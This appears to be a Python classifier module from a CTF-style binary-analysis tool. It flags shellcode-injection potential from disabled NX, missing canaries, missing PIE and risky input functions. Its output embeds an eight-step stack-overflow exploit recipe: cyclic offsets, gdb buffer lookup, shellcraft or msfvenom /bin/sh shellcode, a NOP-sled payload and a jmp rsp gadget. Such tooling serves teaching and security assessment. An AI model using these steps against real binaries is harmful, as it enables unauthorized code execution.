"""
shellcode.py — Detect shellcode injection potential (NX disabled).

Signals:
  • NX / DEP disabled  (executable stack)
  • RWX segments present
  • Large input buffers / unchecked reads
"""

from __future__ import annotations

from ..models import VulnerabilityMatch, Difficulty


def classify_shellcode_injection(ctx: dict) -> list[VulnerabilityMatch]:
    """Check whether the binary allows shellcode injection."""
    prot = ctx["protections"]
    imports = set(ctx["imported_functions"])
    has_rwx = ctx.get("has_rwx_segment", False)
    evidence: list[str] = []
    confidence = 0.0

    # ── NX disabled = executable stack ────────────────────────────
    if prot.nx.value == "Disabled":
        evidence.append("NX is DISABLED — stack/heap is executable")
        confidence += 0.45
    elif has_rwx:
        evidence.append("Binary has RWX LOAD segment — writable and executable region exists")
        confidence += 0.35
    else:
        # NX enabled → shellcode on stack won't work
        return []

    # ── input vector present ──────────────────────────────────────
    input_funcs = {"gets", "read", "recv", "fgets", "fread", "scanf",
                   "__isoc99_scanf", "recvfrom"}
    found_input = imports & input_funcs
    if found_input:
        evidence.append(f"Input functions: {', '.join(sorted(found_input))}")
        confidence += 0.20

    # ── no canary → easier overflow ───────────────────────────────
    if prot.canary.value == "Disabled":
        evidence.append("Stack canary DISABLED — buffer overflow to control EIP/RIP is straightforward")
        confidence += 0.10

    # ── no PIE → known buffer address ─────────────────────────────
    if prot.pie.value == "Disabled":
        evidence.append("PIE DISABLED — buffer address is deterministic")
        confidence += 0.10

    # ── mprotect / mmap in imports (JIT-spray potential) ──────────
    if "mprotect" in imports or "mmap" in imports:
        evidence.append("mprotect/mmap imported — possible runtime RWX region creation")
        confidence += 0.05

    confidence = min(confidence, 1.0)

    return [VulnerabilityMatch(
        id=3,
        name="Shellcode Injection (no NX)",
        category="Code Injection",
        difficulty=Difficulty.BEGINNER_INTERMEDIATE,
        confidence=confidence,
        description=(
            "Inject raw machine-code shellcode into a buffer and redirect "
            "execution to it. Requires the stack or heap to be executable "
            "(NX/DEP disabled) — common in older or intentionally vulnerable binaries."
        ),
        tags=["shellcode", "no NX", "stack"],
        evidence=evidence,
        recommendations=[
            "Generate shellcode: pwntools shellcraft.sh() or msfvenom.",
            "Find buffer address (gdb, or known via no-PIE).",
            "Payload: NOP sled + shellcode + ret-addr overwrite pointing to buffer.",
            "If ASLR is on, consider a NOP sled or JMP ESP gadget.",
        ],
        exploit_steps=[
            "Step 1 — Verify executable stack: Run checksec and confirm NX is disabled. This means any data written to the stack can be executed as code.",
            "Step 2 — Find the buffer overflow: Identify the vulnerable function that reads input into a stack buffer without proper bounds checking (same as ret2win recon).",
            "Step 3 — Determine the offset: Use a cyclic pattern to find how many bytes until you overwrite the saved return address:\n    from pwn import *\n    p = process('./<binary>')\n    p.sendline(cyclic(300))\n    # Inspect crash: cyclic_find(<fault_addr>)",
            "Step 4 — Find the buffer address: In gdb, set a breakpoint after the read and inspect the buffer address:\n    gdb> break *vuln+<offset_after_read>\n    gdb> run <<< $(python3 -c \"print('A'*100)\")\n    gdb> x/20x $rsp   # or $esp on 32-bit\n    Note the address where your 'A's start.",
            "Step 5 — Generate shellcode:\n    # pwntools (Linux x86_64 execve /bin/sh):\n    shellcode = asm(shellcraft.sh())\n    # Or use msfvenom:\n    # msfvenom -p linux/x64/exec CMD=/bin/sh -f python",
            "Step 6 — Build the payload:\n    nop_sled = b'\\x90' * 64          # Padding NOP sled\n    offset = <found_offset>\n    buf_addr = <buffer_address>\n    payload  = nop_sled + shellcode\n    payload += b'A' * (offset - len(payload))\n    payload += p64(buf_addr)         # Overwrite ret → buffer",
            "Step 7 — Exploit:\n    p = process('./<binary>')\n    p.sendline(payload)\n    p.interactive()  # Should drop into a shell",
            "Step 8 — If ASLR is on: Use a JMP ESP/RSP gadget instead of a hardcoded buffer address:\n    jmp_rsp = next(elf.search(asm('jmp rsp')))\n    payload = b'A' * offset + p64(jmp_rsp) + nop_sled + shellcode",
        ],
    )]
